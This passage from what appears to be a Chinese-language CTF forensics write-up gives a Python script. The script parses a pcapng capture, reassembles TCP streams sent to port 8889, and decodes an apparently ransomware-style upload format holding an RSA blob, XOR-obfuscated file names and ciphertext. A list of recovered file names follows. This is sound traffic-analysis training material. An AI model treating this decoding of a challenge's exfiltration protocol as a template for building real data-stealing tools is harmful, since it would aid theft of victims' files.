</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>collections</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PCAP</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;dump.pcapng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>OUT</span>  <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;batches&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>OUT</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>parents</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_pcapng</span><span class=p>(</span><span class=n>path</span><span class=p>:</span> <span class=n>Path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>path</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>interfaces</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>packets</span> <span class=o>=</span> <span class=p>[]</span>  <span class=c1># (iface_id, ts, caplen, pktlen, pktdata)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>off</span> <span class=o>+</span> <span class=mi>12</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>block_type</span><span class=p>,</span> <span class=n>total_len</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;II&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>off</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>total_len</span> <span class=o>&lt;</span> <span class=mi>12</span> <span class=ow>or</span> <span class=n>off</span> <span class=o>+</span> <span class=n>total_len</span> <span class=o>&gt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=n>b</span><span class=p>[</span><span class=n>off</span><span class=o>+</span><span class=mi>8</span> <span class=p>:</span> <span class=n>off</span><span class=o>+</span><span class=n>total_len</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>block_type</span> <span class=o>==</span> <span class=mh>0x00000001</span><span class=p>:</span>  <span class=c1># IDB</span>
</span></span><span class=line><span class=cl>            <span class=n>linktype</span><span class=p>,</span> <span class=n>_</span><span class=p>,</span> <span class=n>snaplen</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;HHi&#34;</span><span class=p>,</span> <span class=n>body</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>interfaces</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;linktype&#34;</span><span class=p>:</span> <span class=n>linktype</span><span class=p>,</span> <span class=s2>&#34;snaplen&#34;</span><span class=p>:</span> <span class=n>snaplen</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>block_type</span> <span class=o>==</span> <span class=mh>0x00000006</span><span class=p>:</span>  <span class=c1># EPB</span>
</span></span><span class=line><span class=cl>            <span class=n>iface_id</span><span class=p>,</span> <span class=n>ts_high</span><span class=p>,</span> <span class=n>ts_low</span><span class=p>,</span> <span class=n>caplen</span><span class=p>,</span> <span class=n>pktlen</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;IIIII&#34;</span><span class=p>,</span> <span class=n>body</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>pkt_data</span> <span class=o>=</span> <span class=n>body</span><span class=p>[</span><span class=mi>20</span><span class=p>:</span><span class=mi>20</span><span class=o>+</span><span class=n>caplen</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>ts</span> <span class=o>=</span> <span class=p>(</span><span class=n>ts_high</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=n>ts_low</span>
</span></span><span class=line><span class=cl>            <span class=n>packets</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>iface_id</span><span class=p>,</span> <span class=n>ts</span><span class=p>,</span> <span class=n>caplen</span><span class=p>,</span> <span class=n>pktlen</span><span class=p>,</span> <span class=n>pkt_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>off</span> <span class=o>+=</span> <span class=n>total_len</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>interfaces</span><span class=p>,</span> <span class=n>packets</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ipv4_parse</span><span class=p>(</span><span class=n>pkt</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>20</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>vihl</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ver</span> <span class=o>=</span> <span class=n>vihl</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=n>ihl</span> <span class=o>=</span> <span class=p>(</span><span class=n>vihl</span> <span class=o>&amp;</span> <span class=mh>0x0F</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ver</span> <span class=o>!=</span> <span class=mi>4</span> <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>ihl</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>total_len</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;H&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>proto</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=n>pkt</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>dst</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=n>pkt</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>20</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>[</span><span class=n>ihl</span><span class=p>:</span><span class=n>total_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;proto&#34;</span><span class=p>:</span> <span class=n>proto</span><span class=p>,</span> <span class=s2>&#34;src&#34;</span><span class=p>:</span> <span class=n>src</span><span class=p>,</span> <span class=s2>&#34;dst&#34;</span><span class=p>:</span> <span class=n>dst</span><span class=p>,</span> <span class=s2>&#34;payload&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tcp_parse</span><span class=p>(</span><span class=n>seg</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>seg</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>20</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>sport</span><span class=p>,</span> <span class=n>dport</span><span class=p>,</span> <span class=n>seq</span><span class=p>,</span> <span class=n>ack</span><span class=p>,</span> <span class=n>off_flags</span><span class=p>,</span> <span class=o>*</span><span class=n>_</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;HHIIHHHH&#34;</span><span class=p>,</span> <span class=n>seg</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=p>(</span><span class=n>off_flags</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>seg</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>off</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>seg</span><span class=p>[</span><span class=n>off</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;sport&#34;</span><span class=p>:</span> <span class=n>sport</span><span class=p>,</span> <span class=s2>&#34;dport&#34;</span><span class=p>:</span> <span class=n>dport</span><span class=p>,</span> <span class=s2>&#34;seq&#34;</span><span class=p>:</span> <span class=n>seq</span><span class=p>,</span> <span class=s2>&#34;ack&#34;</span><span class=p>:</span> <span class=n>ack</span><span class=p>,</span> <span class=s2>&#34;payload&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reassemble</span><span class=p>(</span><span class=n>segments</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>segs</span> <span class=o>=</span> <span class=p>[</span><span class=n>s</span> <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>segments</span> <span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=mi>2</span><span class=p>]]</span>  <span class=c1># (seq, ts, payload)</span>
</span></span><span class=line><span class=cl>    <span class=n>segs</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=n>segs</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cur</span> <span class=o>=</span> <span class=n>base</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>seq</span><span class=p>,</span> <span class=n>ts</span><span class=p>,</span> <span class=n>payload</span> <span class=ow>in</span> <span class=n>segs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>seq</span> <span class=o>&gt;</span> <span class=n>cur</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>out</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>seq</span> <span class=o>-</span> <span class=n>cur</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>cur</span> <span class=o>=</span> <span class=n>seq</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>seq</span> <span class=o>&lt;</span> <span class=n>cur</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>start</span> <span class=o>=</span> <span class=n>cur</span> <span class=o>-</span> <span class=n>seq</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>start</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=n>payload</span><span class=p>[</span><span class=n>start</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>                <span class=n>cur</span> <span class=o>+=</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>-</span> <span class=n>start</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>out</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>cur</span> <span class=o>+=</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_app_payload</span><span class=p>(</span><span class=n>blob</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>blob</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x89</span><span class=s2>ali&#34;</span><span class=p>,</span> <span class=s2>&#34;bad magic&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>batch</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>blob</span><span class=p>,</span> <span class=mi>4</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>rsa_len</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>blob</span><span class=p>,</span> <span class=mi>8</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl>    <span class=n>rsa</span> <span class=o>=</span> <span class=n>blob</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>rsa_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>+=</span> <span class=n>rsa_len</span>
</span></span><span class=line><span class=cl>    <span class=n>file_count</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>blob</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>file_count</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>name_len</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>blob</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=n>name_xor</span> <span class=o>=</span> <span class=n>blob</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>name_len</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=n>name_len</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>c</span> <span class=o>^</span> <span class=mi>233</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>name_xor</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>foff</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>blob</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=n>files</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>name</span><span class=p>,</span> <span class=n>foff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>blob</span><span class=p>[</span><span class=n>off</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>batch</span><span class=p>,</span> <span class=n>rsa</span><span class=p>,</span> <span class=n>files</span><span class=p>,</span> <span class=n>cipher</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ifaces</span><span class=p>,</span> <span class=n>pkts</span> <span class=o>=</span> <span class=n>parse_pcapng</span><span class=p>(</span><span class=n>PCAP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 只关心：DLT_NULL(0) + AF_INET(2) + TCP</span>
</span></span><span class=line><span class=cl>    <span class=n>streams</span> <span class=o>=</span> <span class=n>collections</span><span class=o>.</span><span class=n>defaultdict</span><span class=p>(</span><span class=nb>list</span><span class=p>)</span>  <span class=c1># key=(src_ip, sport, dst_ip, dport)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>iface_id</span><span class=p>,</span> <span class=n>ts</span><span class=p>,</span> <span class=n>caplen</span><span class=p>,</span> <span class=n>pktlen</span><span class=p>,</span> <span class=n>pktdata</span> <span class=ow>in</span> <span class=n>pkts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ifaces</span><span class=p>[</span><span class=n>iface_id</span><span class=p>][</span><span class=s2>&#34;linktype&#34;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>fam</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>pktdata</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>fam</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=n>ipv4_parse</span><span class=p>(</span><span class=n>pktdata</span><span class=p>[</span><span class=mi>4</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>ip</span> <span class=ow>or</span> <span class=n>ip</span><span class=p>[</span><span class=s2>&#34;proto&#34;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>6</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>tcp</span> <span class=o>=</span> <span class=n>tcp_parse</span><span class=p>(</span><span class=n>ip</span><span class=p>[</span><span class=s2>&#34;payload&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>tcp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=p>(</span><span class=n>ip</span><span class=p>[</span><span class=s2>&#34;src&#34;</span><span class=p>],</span> <span class=n>tcp</span><span class=p>[</span><span class=s2>&#34;sport&#34;</span><span class=p>],</span> <span class=n>ip</span><span class=p>[</span><span class=s2>&#34;dst&#34;</span><span class=p>],</span> <span class=n>tcp</span><span class=p>[</span><span class=s2>&#34;dport&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>streams</span><span class=p>[</span><span class=n>key</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>tcp</span><span class=p>[</span><span class=s2>&#34;seq&#34;</span><span class=p>],</span> <span class=n>ts</span><span class=p>,</span> <span class=n>tcp</span><span class=p>[</span><span class=s2>&#34;payload&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 找 client-&gt;server（dport=8889）的 3 条流并解析 payload</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>streams</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>key</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>8889</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>blob</span> <span class=o>=</span> <span class=n>reassemble</span><span class=p>(</span><span class=n>streams</span><span class=p>[</span><span class=n>key</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>batch</span><span class=p>,</span> <span class=n>rsa</span><span class=p>,</span> <span class=n>files</span><span class=p>,</span> <span class=n>cipher</span> <span class=o>=</span> <span class=n>parse_app_payload</span><span class=p>(</span><span class=n>blob</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>OUT</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch</span><span class=si>}</span><span class=s2>_rsa.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>rsa</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>OUT</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch</span><span class=si>}</span><span class=s2>_cipher.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 顺便把文件表写出来方便后续</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>OUT</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch</span><span class=si>}</span><span class=s2>_files.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>name</span><span class=p>,</span> <span class=n>off</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>off</span><span class=si>}</span><span class=se>\t</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] batch </span><span class=si>{</span><span class=n>batch</span><span class=si>}</span><span class=s2>: rsa=</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>rsa</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes, files=</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>files</span><span class=p>)</span><span class=si>}</span><span class=s2>, cipher=</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>解析完得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=mi>0</span><span class=w>        </span><span class=n>unknown</span><span class=o>/</span><span class=n>app</span><span class=o>/</span><span class=n>src</span><span class=o>/</span><span class=n>main</span><span class=o>/</span><span class=n>java</span><span class=o>/</span><span class=n>com</span><span class=o>/</span><span class=n>unknown</span><span class=o>/</span><span class=n>AbstractPatternMachine</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3576</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part3</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>21277</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part1</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>0</span><span class=w>        </span><span class=n>unknown</span><span class=o>/</span><span class=n>app</span><span class=o>/</span><span class=n>src</span><span class=o>/</span><span class=n>main</span><span class=o>/</span><span class=n>java</span><span class=o>/</span><span class=n>com</span><span class=o>/</span><span class=n>unknown</span><span class=o>/</span><span class=n>ParticlePhysicsSimulator</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3577</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part4</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>21084</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part2</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>0</span><span class=w>        </span><span class=n>unknown</span><span class=o>/</span><span class=n>app</span><span class=o>/</span><span class=n>src</span><span class=o>/</span><span class=n>main</span><span class=o>/</span><span class=n>java</span><span class=o>/</span><span class=n>com</span><span class=o>/</span><span class=n>unknown</span><span class=o>/</span><span class=n>GeneticAlgorithmEngine</span><span class=p>.</span><span class=n>java</span><span class=w>
